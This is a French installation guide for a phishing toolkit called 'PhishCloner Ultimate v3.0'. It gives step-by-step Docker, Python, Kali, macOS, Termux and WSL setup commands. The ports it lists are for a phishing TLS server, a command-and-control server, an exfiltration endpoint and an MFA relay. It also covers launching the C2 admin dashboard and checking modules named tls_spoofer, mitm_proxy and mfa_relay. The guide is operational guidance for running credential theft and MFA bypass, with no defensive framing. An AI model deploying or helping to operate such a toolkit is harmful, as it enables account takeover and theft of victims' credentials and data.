# 📥 PhishCloner Ultimate v3.0 — Guide d'installation

> 3 méthodes · Docker natif ou Python natif · multi-plateforme.

## 🎯 Prérequis

| Item | Requis |
|------|--------|
| **OS** | Kali / Debian / Ubuntu / macOS / Termux / WSL2 |
| **Python** | 3.10+ (3.12 recommandé) |
| **Docker** | optionnel (recommandé pour production) |
| **Docker Compose** | optionnel |
| **RAM** | 200 MB |
| **Disque** | 50 MB |
| **Ports** | 8443 (phish TLS) · 5000 (C2) · 9000 (exfil) · 8444 (MFA) |

## ⚡ Méthode 1 — Docker (recommandée)

```bash
# 1. Clone
git clone https://github.com/187Ghost101/phishcloner-ultimate.git
cd phishcloner-ultimate

# 2. Build
docker-compose build

# 3. Run
docker-compose up -d

# 4. Status
docker-compose ps

# 5. Logs
docker-compose logs -f phishcloner
```

Ports exposés :
- `8443` → phish server (TLS)
- `5000` → C2 server (HTTP + WebSocket)
- `9000` → exfil (HTTPS)
- `8444` → MFA relay

## 🔧 Méthode 2 — Setup natif Python

```bash
# 1. Clone
git clone https://github.com/187Ghost101/phishcloner-ultimate.git
cd phishcloner-ultimate

# 2. Setup
chmod +x setup.sh
./setup.sh
```

Le script :
1. Crée `venv/`
2. Installe `requirements.txt`
3. Génère les certs TLS par défaut (`certs/`)
4. Crée les dossiers de capture
5. Teste l'import des 9 modules

## 🐧 Kali Linux

```bash
sudo apt update
sudo apt install -y python3-pip python3-venv git docker.io docker-compose
sudo usermod -aG docker $USER  # logout/login ensuite
git clone https://github.com/187Ghost101/phishcloner-ultimate.git
cd phishcloner-ultimate
./setup.sh
# OU Docker
docker-compose up -d
```

## 🍎 macOS

```bash
brew install python3 docker docker-compose colima
colima start
git clone https://github.com/187Ghost101/phishcloner-ultimate.git
cd phishcloner-ultimate
./setup.sh
```

## 📱 Termux (Android)

```bash
pkg update && pkg upgrade
pkg install python git
git clone https://github.com/187Ghost101/phishcloner-ultimate.git
cd phishcloner-ultimate
pip install -r requirements.txt
# Lance (limité) :
python3 engine/tls_spoofer.py &
```

## 🪟 Windows (WSL2)

```powershell
wsl --install
wsl --set-default-version 2

# Dans WSL Ubuntu
sudo apt install python3-pip python3-venv git
git clone https://github.com/187Ghost101/phishcloner-ultimate.git
cd phishcloner-ultimate
./setup.sh
```

## 📊 Lancer le dashboard C2

### Méthode A — HTTP server local

```bash
cd phishcloner-ultimate
python3 -m http.server 8090

# Ouvre http://localhost:8090/c2_admin.html
```

### Méthode B — Via Docker (nginx + dashboard)

```bash
# dashboard est servi par le conteneur principal sur :5000/admin
open http://localhost:5000/admin
```

## ✅ Vérification

### Modules Python
```bash
python3 -c "from engine import tls_spoofer, mitm_proxy, mfa_relay; print('✓ 9 modules OK')"
```

### Certs TLS
```bash
ls -la certs/
# Doit contenir: ca.pem, server.pem, server.key
```

### Dashboard
- Ouvre `c2_admin.html` (via HTTP server ou Docker)
- 9 panels dans sidebar
- Topbar affiche `PHISHCLONER ULTIMATE v3.0 · NOCTURNE`

## 🆘 Troubleshooting

### Port 8443 occupé
```bash
# Voir
sudo lsof -i :8443

# Changer dans engine/mitm_proxy.py
PORT = int(os.getenv('PHISH_PORT', 9443))
```

### Docker permission denied
```bash
sudo usermod -aG docker $USER
newgrp docker
```

### Module import fail
```bash
pip3 install -r requirements.txt --force-reinstall
# Vérifier Python >= 3.10
python3 --version
```

### Certs TLS manquants
```bash
python3 engine/tls_spoofer.py --generate
# OU
mkdir -p certs && cd certs
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.pem -days 365 -nodes
```

## 🔄 Mise à jour

```bash
git pull origin main
docker-compose build  # si Docker
pip3 install -r requirements.txt --upgrade  # si Python natif
```

---

**Prêt ?** → [USAGE.md](USAGE.md) pour le guide d'utilisation.

🏴‍☠️ **ghost1o1** — *"There is no lock."*
